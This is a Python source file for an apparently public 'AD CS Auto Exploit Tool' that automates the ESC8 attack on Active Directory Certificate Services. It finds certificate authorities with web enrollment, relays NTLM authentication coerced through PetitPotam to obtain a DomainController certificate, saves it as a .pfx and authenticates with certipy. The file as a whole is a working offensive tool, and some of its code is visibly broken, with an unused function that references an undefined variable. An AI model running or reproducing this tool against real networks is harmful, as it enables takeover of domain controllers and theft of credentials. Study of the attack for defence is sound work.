#!/usr/bin/env python
# coding: utf-8
#
# By Leon Johnson - twitter.com/sho_luv
#
# This program I wrote with the help of chatGPT
# it a wrapper for certipy and ntlmrelayx to automate esc8

import os
import re
import sys
import json
import fcntl
import socket
import struct
import base64
import argparse
import requests
import threading
import subprocess
from termcolor import colored
from requests.auth import HTTPBasicAuth
from impacket.examples.utils import parse_credentials


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode('utf-8'))  # Encode string as bytes
    )[20:24])

def login_and_get_status(dns_name, username, password, nthash):
    url = f"http://{dns_name}/certsrv/certfnsh.asp"
    if nthash:
        pretty_print("[!] Can't Verify Web Enrollment Server With Hashes, Proceeding As If True", verbose=True)
        return 200

    try:
        pretty_print("[*] Trying to auth to " + url)
        response = requests.get(url, auth=HTTPBasicAuth(username, password))
        status_code = response.status_code

        if status_code == 200:
            pretty_print("[*] Successful login")
        elif status_code == 401:
            pretty_print("[!] User Is Unauthorized To Access Web Enrollment On " + dns_name, verbose=True)
        elif status_code == 403:
            pretty_print("[!] Web Enrollment Server 403 Forbidden Access Deined", verbose=True)
        elif status_code == 404:
            pretty_print("[!] Web Enrollment Server 404 Error Not Found", verbose=True)
        # Add additional elif statements here for other status codes
        else:
            pretty_print("[!] Web Enrollment ERROR: HTTP status code:" + str(status_code), verbose=True)

        return status_code
    except requests.exceptions.RequestException as e:
        print("Request failed:", str(e))

def pretty_print(line, verbose=False):
    line = line.rstrip('\n')  # remove trailing newline characters
    colored_line = line
    if verbose:
        if line.startswith("[*]"):
            colored_line = line.replace("[*]", colored("[*]", "green"))
        elif line.startswith("[!]"):
            colored_line = line.replace("[!]", colored("[!]", "red"))
        print(colored_line)
    elif line.startswith("[*]"):
        colored_line = line.replace("[*]", colored("[*]", "green"))
        print(colored_line)

def certipy_auth(certname,  domain, verbose=False):
    pfx = certname + ".pfx"
    command = ["certipy", "auth", "-pfx", pfx, "-username", certname, "-domain", domain]
    pretty_print("[*] " + " ".join(command))
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    for line in process.stdout:
        pretty_print(line, verbose)
    process.wait()


def certipy_find(username, password, nthash, domain, verbose=False):
    if password is not None:
        command = ["certipy", "find", "-u", username, "-p", password, "-target", domain, "-output", "adcs"]
    else:
        command = ["certipy", "find", "-u", username, "-hashes", nthash, "-target", domain, "-output", "adcs"]
    pretty_print("[*] " + " ".join(command))

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    for line in process.stdout:
        if "Failed to authenticate to LDAP. Invalid credentials" in line:
            colored_line = line.replace("[-]", colored("[!]", "red"))
            pretty_print(colored_line, verbose=True)
            sys.exit(1)  # exit with an error code
        pretty_print(line, verbose)
    process.wait()

def run_ntlmrelayx_and_petitpotam(username, password, nthash, domain, verbose=False):
    with open("adcs_Certipy.json", "r") as file:
        data = json.load(file)

    certificate_authorities = data.get("Certificate Authorities")
    ca_found = False
    if certificate_authorities:
        for ca in certificate_authorities.values():
            web_enrollment = ca.get("Web Enrollment")
            dns_name = ca.get("DNS Name")
            if web_enrollment == "Enabled" and dns_name:
                ca_found = True
                if login_and_get_status(dns_name, username, password, nthash) == 200:
                    ntlmrelayx_command = (
                        f"ntlmrelayx.py --target http://{dns_name}/certsrv/certfnsh.asp "
                        "--adcs --template DomainController"
                    )
                    pretty_print("[*] " + ntlmrelayx_command, verbose)

                    if nthash:
                        lmnthash = ":" + nthash
                        petitpotam_command = (
                            f"python PetitPotam.py -u {username} -hashes {lmnthash} "
                            f"{get_ip_address('eth0')} {domain}"
                        )
                    else:
                        petitpotam_command = (
                            f"python PetitPotam.py -u {username} -p {password} "
                            f"{get_ip_address('eth0')} {domain}"
                        )
                    pretty_print("[*] " + petitpotam_command, verbose)

                    # Run ntlmrelayx
                    with subprocess.Popen(
                        ntlmrelayx_command, shell=True, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT
                    ) as ntlmrelayx_process:

                        # Run PetitPotam
                        with subprocess.Popen(
                            petitpotam_command, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, universal_newlines=True
                        ) as petitpotam_process:

                            # Print ntlmrelayx output as it's generated if verbose flag is set
                            for line in iter(ntlmrelayx_process.stdout.readline, b''):
                                line = line.decode().strip()
                                pretty_print(line, verbose)

                                cert = re.search(r"Base64 certificate of user (\w+\$?):", line)
                                if cert is not None:
                                    certname = cert.group(1)
                                    base64_certificate = next(
                                        iter(ntlmrelayx_process.stdout.readline, b'')
                                    )
                                    if verbose:
                                        print("\033[93m" + base64_certificate.decode().strip() + "\033[0m")

                                    # Extract base64 certificate from ntlmrelayx output
                                    save_certificate(certname, base64_certificate)
                                    certipy_auth(certname,  domain, verbose)

                                    ntlmrelayx_process.terminate()
                                    break  # Stop reading output once we have the certificate


                            if ntlmrelayx_process.poll() is None:
                                print("Process terminated due to timeout")
                else:
                    if verbose:
                        pretty_print("[!] Unable to verify web enrollment access on " + dns_name, verbose=True)


    if not ca_found:
        print("\033[91m[!] There are no Certificate Authorities with web enrollment enabled :( womp womp \033[0m", end='')  # Print in red

def extract_base64_certificate(output):
    match = next(iter(ntlmrelayx_process.stdout.readline, b''))
    if match:
        print("\033[93m" + match + "\033[0m")
        base64_certificate = match.group(1).strip()
        print("\033[93m" + base64_certificate + "\033[0m")
        return base64_certificate
    else:
        return None


def save_certificate(username, base64_certificate):
    pfx_filename = f"{username}.pfx"
    with open(pfx_filename, "wb") as file:
        file.write(base64.b64decode(base64_certificate))


def main():

    banner_big = """

              ,,╓╔╗#▒▒▒╬▒╓
              ╬╬╬╬╬▒╠└     ╔╔╔╔╔╔╔╔╔╔╔╔ç                          ,@@@@@@@@@@@@@m
             ║╬╬╬╬╬╬╬▒     ╬╬╬╬╬╬╬╬╬╬╬╬╬              ╣▒▒╗╗╓,    ╔╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬ε
            ]╬╬╬╬╬╬╬╬╬     ╬╬╬╬╬╬╬╬╬╬╬╬╬▒            ]╬╬╬╬╬╬╬╬╬ #╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
            ╣╬╬╬╬╩╬╬╬╬▒    ╬╬╬╬╬╬╬╬╬╬╬╬╬╬µ         ,╔▒╬╬╬╬╬╬╬╬╬  "╣╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
           ╔╬╬╬╬╬ ╢╬╬╬╬     ]╬╬╬╬╬╬╬╬L ╚╬╬     ,╔▒╣╬╬╬╬╬╬╬╬╬╬╬╬    `╝╬╬╬╬╬╬╬╬╬╬╬╬╬╬▒
           ╬╬╬╬╬▓▓╬╬╬╬╬▒    ]╬╬╬╬╬╬╬╬L  ╬╬▒  [╣╬╬╬╬╬╬╬╝╙ ║╝╙`         ╚╬╬╬└╙╙╝╣╬╬╬╬
          ╣╬╬╬╬╙   ╬╬╬╬╬    ]╬╬╬╬╬╬╬╬L  ╘╬╬  ║╬╬╬╬╬╬      ,φ╣╬Γ ,       ╙╬╬▒   ]╬╩
      @▒╬╔╬╬╬╬╬    ║╬╬╬╬▒   ]╬╬╬╬╬╬╬╬L   ║╬▒  ╙╬╬╬╬╬╣╦,╔▒╬╬╬╬╬Γ ╚╬╬▓▒╗╗╓  ╙╣╬▒,
     ║╬╬ ╬╬╬╬╬     '╬╬╬╬╬   ]╬╬╬╬╬╬╬╬▒╓╗@╣╬╬⌐   ╙╣╬╬╬╬╬╬╬╬╬╬╬╬Γ  ╢╬▒@╗▄▒    └╣╬▒╓
     ╬╬╬╣╬╝╝╙`      ╢╬╬╬╬▒  ]╬╬╬╬╬╬╬╬╬╬╝╜╙`       "╣╬╬╬╬╬╣╜╠╢╝`  ╘╬╬╬╬╬╬╬╬╬▒@╗╬╬╬▓ε
    "╙              ╚╬╬╬╬╬  ]╬╝╩╙╙`                 `╝╙   "       ║╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬Γ
                     ╙╝╬╬╬▒                                        ╙╝╬╬╬╬╬╬╬╬╬╬╬╬╬Γ
                          ╙                                              `╙╙╝╬╬╬╬╬Γ
    """
    # Create colored text variables
    active_directory = colored("Active Directory Certificate Services", "white", attrs=["bold"])
    tool_by = colored("AD CS Auto Exploit Tool by Leon Johnson aka", "white", attrs=["bold"])
    handle = colored("@sho_luv", "yellow", attrs=["bold"])

    # Combine colored text variables into banner
    banner_small = """
               #▒     ║▒▒╗╗,      é▒╗╖,   ╓╗#▒▒
             ╒╣╣╙╣    ╠╬╜^╬╬╬    ╬╬▌^╣╣  ╣╬╬ ╙╝
            ]╬╬,,╬▓-  ╠╬  ║╬╛    ║╬b      ╙╬▒
            ║╬╣╙ ╟╬µ  ╬╬  ╣╩     ╣╬▌     ╔, ╟╬▒
            ║╩  ,╬╬▒  ╙╣▒╣╙       ╙╝╣Å   └╬╬╝╜
      
           {}
     {} {}
       """.format(active_directory, tool_by, handle)


    parser = argparse.ArgumentParser()
    parser.add_argument('target', action='store', help='domain/username[:password]')

    parser.add_argument("-v", "--verbose", action="store_true", help="increase output verbosity")
    parser.add_argument("-p", "--password", action="store", help="Domain Password")
    parser.add_argument("-hashes", action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')

    if len(sys.argv)==1:
        print( banner_small )
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    domain, username, password = parse_credentials(options.target)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")

    password = options.password
    lmhash = nthash = ''

    if options.hashes is not None and password is not None:
        print("Error: You cannot provide both password and hashes.")
        sys.exit(1)
    elif options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    elif password is None:  # No password or hashes provided, ask for password
        from getpass import getpass
        print("Password not provided, please enter password: ")
        password = getpass()
        if not password:  # user didn't enter password
            print("Invalid password")
            sys.exit(1)

    certipy_find(username, password, nthash, domain, options.verbose)
    run_ntlmrelayx_and_petitpotam(username, password, nthash, domain, options.verbose)


if __name__ == "__main__":
    main()
